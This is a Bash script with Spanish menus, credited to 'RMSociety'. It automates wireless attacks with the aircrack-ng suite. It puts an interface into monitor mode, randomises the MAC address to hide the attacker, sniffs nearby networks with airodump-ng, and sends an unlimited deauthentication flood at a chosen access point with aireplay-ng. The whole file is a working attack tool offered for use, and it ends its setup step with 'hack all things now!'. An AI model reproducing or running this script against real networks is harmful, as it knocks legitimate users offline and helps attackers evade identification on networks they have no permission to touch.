#!/bin/bash
clear

# Muestra el menu general
_banner(){
   echo "									      "
   echo "                            ,,╓╓╓▄▄╓╓;,                                      "
   echo "                     ,▄▄▓████▀▀▀▀▀▀▀▀▀▀████▄▄▄                               "
   echo "                 ,▄▓██▀▀└                  ╙▀▀██▓▄                           "
   echo "              ╓▄██▀╙                            ▀███▄                        "
   echo "            ▄██▀└                                  ▀██▓µ                     "
   echo "          ▄██▀      .█p    ,▄▄                       ╙▀██φ                   "
   echo "        ╓██▀        ║███ ╓▓███                         ╙███                  "
   echo "       ▄██     ╙██▓▄██████████⌐ ╓▄▄                      ▀██▄                "
   echo "      ██▌       ██████████████████                        ╙██▄               "
   echo "     ▓█▌  ²▓█████████████████████▄ç,                       ╙██▄              "
   echo "    ║██     ╙███████████████████████Γ                       ╙██⌐             "
   echo "    ██M     ,▄████▌    ██▀▀▀▀█████▄                          ███             "
   echo "   ║██    ▄███████▄▄▄▄▄▓█▄▄▄▄▄██████▌                        ▐██⌐            "
   echo "   ██▌       ▀███████████████████▀└   ▄▄████████▄▄            ██▌            "
   echo "   ██▌      ,▄████████████████████▌ ▄██████████████▓          ██▌            "
   echo "   ██▌      ▀▀██████████████████▌ ▄██████████████████▄       ▐██▌            "
   echo "   ║██        ╓████████████████▀╙║████████████████████w      ║██H            "
   echo "   ╙██▌       ╙╙╙║████████████▀* ████████▀╙██▀▀███████▌      ███             "
   echo "    ███             ╙▀█████▀╙   ▐███▌      ║█       ██▌     ║██M             "
   echo "     ███         ╓▄▄███████▓▄▄▄µ ║███▌▄  ▄▄███▄▄╓╓▄███▌    ▄██▌              "
   echo "      ███       ████████████████▌██████████████████████   ▄██▌               "
   echo "       ███▄    ║███████████▌█████⌐└╙████████████████▀   ,███▀                "
   echo "        ▀███⌂ ,██████▌█████▌██████   ╙▀███████████▀    ▄███╨                 "
   echo "         ╙▀███████████████████████▄  ╓████████████▌ ,▄███▀                   "
   echo "           ╙▀██████████████████████ ╓██████████████████▀                     "
   echo "              ▀████████████████████▌║████████████████▀                       "
   echo "                 ▀███████████████████████████████▀▀                          "
   echo "                    ╙▀▀██████████████████████▀▀                              "
   echo "                          └╙▀▀▀▀▀▀▀▀▀▀▀▀╙                                    "
   echo "									      "
   echo "Script para automatizar cambio de MAC, Sniffeo de red y ataque de desautenticacion"
   echo "******************************By RMSociety****************************************"


}

_menu(){
    _banner
    echo "Selecciona una opcion:"
    echo
    echo "1) Poner interfaz en modo monitor cambiando MAC"
    echo "2) Sniffear red"
    echo "3) Ataque de desautentcacion"
    echo
    echo "4) Salir"
    echo
    echo -n "Indica una opcion: "
}

# Muestra la opcion seleccionada del menu

_mostrarResultado(){
    clear
    echo ""
    echo "------------------------------------"
    echo "Has seleccionado la opcion $1"
    echo "------------------------------------"
    echo ""
}

_cambiarMAC(){
    echo "Poner interfaz en modo monitor cambiando MAC"
    echo "ingresa la interface:"
    read interface
    echo "interface: " $interface
    airmon-ng check kill $interface
    airmon-ng start $interface
    intMon=$interface"mon"
    echo $intMon
    ifconfig $intMon down
    macchanger -r $intMon
    ifconfig $intMon up
    echo "hack all things now!"
}

_sniffear(){
    echo "Empezar Sniffeo"
    echo "ingresa la interface:"
    read interface
    echo "interface: " $interface
    airodump-ng $interface"mon"
}

_deauth(){
    echo "Empezar desautenticacion"
    echo "ingresa la interfaz:"
    read interface
    echo "ingresa la direccion MAC del punto de acceso"
    read macAp
    echo "MAC AccessPoint: " $macAp
    echo "ingresa nombre de la red"
    read essid
    aireplay-ng --deauth 0 -a $macAp -e $essid $interface"mon"

}

# opcion por defecto
opc="0"
# bucle mientas la opcion indicada sea diferente de 9 (salir)
until [ "$opc" -eq "4" ];
do
  case $opc in
    1)
       _mostrarResultado $opc
       _cambiarMAC
       _menu
       ;;
    2)
       _mostrarResultado $opc
       _sniffear
       _menu
       ;;
    3)
       _mostrarResultado $opc
       _deauth
       _menu
       ;;
    4)
       _mostrarResultado $opc
       _menu
       ;;
    *)
       # Esta opcion se ejecuta si no es ninguna de las anteriores
       clear
       _menu
       ;;
    esac
    read opc
done
